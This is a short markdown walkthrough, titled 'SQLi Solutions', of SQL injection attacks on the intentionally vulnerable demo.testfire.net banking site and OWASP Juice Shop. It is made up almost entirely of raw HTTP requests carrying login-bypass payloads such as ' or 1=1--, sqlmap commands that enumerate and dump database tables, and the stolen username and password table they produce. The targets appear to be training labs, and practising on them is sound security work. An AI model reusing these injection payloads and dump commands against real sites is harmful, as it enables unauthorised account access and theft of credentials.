## SQLi Solutions 
### Bypass Login and dump tables http://demo.testfire.net/bank/login.aspx
```
POST /bank/login.aspx HTTP/1.1
Host: demo.testfire.net
Content-Length: 41
Cache-Control: max-age=0
Origin: http://demo.testfire.net
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3488.0 Safari/537.36 autochrome/red
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://demo.testfire.net/bank/login.aspx
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: amSessionId=15463717023; ASP.NET_SessionId=sek2c5bdxjyg4h45r5io3h45; amUserInfo=UserName=anNtaXRo&Password=RGVtbzEyMzQ=
Connection: close

uid=admin+%27+or+1+%3D+1--&passw=aa&btnSubmit=Login

```
```
./sqlmap.py -r session.txt --banner
./sqlmap.py -r session.txt --users --level 3 --risk 3 --technique=B --dbms "Microsoft Access"
./sqlmap.py -r session.txt --tables --level 3 --risk 3 --technique=B --dbms "Microsoft Access"
./sqlmap.py -r session.txt --columns --level 3 --risk 3 --technique=B --dbms "Microsoft Access"  -T users -C username,password --dump --threads 10

....

Database: Microsoft_Access_masterdb
Table: users
[6 entries]
+----------+-----------+
| username | password  |
+----------+-----------+
| admin    | ad\xe3in |
| cclay    | Ali       |
| jsmith   | Demo1234  |
| sjoe     | frazier   |
| sspeed   | Demo1234  |
| tuser    | tuser     |
+----------+-----------+
```



### all your transaction belong to us http://demo.testfire.net/bank/transaction.aspx

```
POST /bank/transaction.aspx HTTP/1.1
Host: demo.testfire.net
Content-Length: 104
Cache-Control: max-age=0
Origin: http://demo.testfire.net
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3488.0 Safari/537.36 autochrome/red
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://demo.testfire.net/bank/transaction.aspx
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: amSessionId=15463717023; ASP.NET_SessionId=sek2c5bdxjyg4h45r5io3h45; amUserInfo=UserName=anNtaXRo&Password=RGVtbzEyMzQ=; amUserId=100116014; amCreditOffer=CardType=Gold&Limit=10000&Interest=7.9
Connection: close

__VIEWSTATE=%2FwEPDwUKMTYzNDg3OTA4NmRk&after=&before=1*

```
```
./sqlmap.py -r session.txt --banner
./sqlmap.py -r session.txt --users --level 3 --risk 3 --technique=B --dbms "Microsoft Access"
./sqlmap.py -r session.txt --tables --level 3 --risk 3 --technique=B --dbms "Microsoft Access"
./sqlmap.py -r session.txt --columns --level 3 --risk 3 --technique=B --dbms "Microsoft Access"  -T users -C username,password --dump --threads 10

....

Database: Microsoft_Access_masterdb
Table: users
[6 entries]
+----------+-----------+
| username | password  |
+----------+-----------+
| admin    | ad\xe3in |
| cclay    | Ali       |
| jsmith   | Demo1234  |
| sjoe     | frazier   |
| sspeed   | Demo1234  |
| tuser    | tuser     |
+----------+-----------+
```
## Juice Shop login bypass
* username: 1'or 1 =1;--
* password: anything
